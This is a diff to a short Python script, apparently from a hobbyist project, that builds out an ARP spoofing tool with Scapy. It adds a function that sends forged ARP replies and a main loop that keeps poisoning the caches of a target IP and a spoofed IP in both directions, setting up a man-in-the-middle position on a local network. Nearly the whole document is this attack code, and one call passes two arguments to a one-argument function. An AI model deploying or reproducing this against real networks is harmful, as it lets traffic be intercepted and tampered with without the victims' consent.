@@ -19,19 +19,22 @@ def get_mac(ip):
     mac = answer[0][1].hwsrc
     return(mac)
     
-#def spoof_arp(target_ip, spoofed_ip):
+def spoof_arp(target_ip, spoofed_ip):
+    mac = get_mac(target_ip, spoofed_ip)
+    packet = ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
+    scapy.send(packet, verbose=False)
     
 
 def main():
     target_ip = input("[*] Enter target ip: ")
-    get_mac(target_ip)
-#     spoofed_ip = input("[*] Enter spoofed ip: ")
-#     try:
-#         while True:
-#             spoof_arp(spoofed_ip, target_ip)
-#             spoof_arp(target_ip, spoofed_ip)
-#             
-#     except KeyboardInterrupt:
-#         exit(0)
+    spoofed_ip = input('Enter spoof ip: ')
+
+    try:
+        while True:
+            spoof_arp(spoofed_ip, target_ip)
+            spoof_arp(target_ip, spoofed_ip)
+             
+    except KeyboardInterrupt:
+        exit(0)
 
 main()
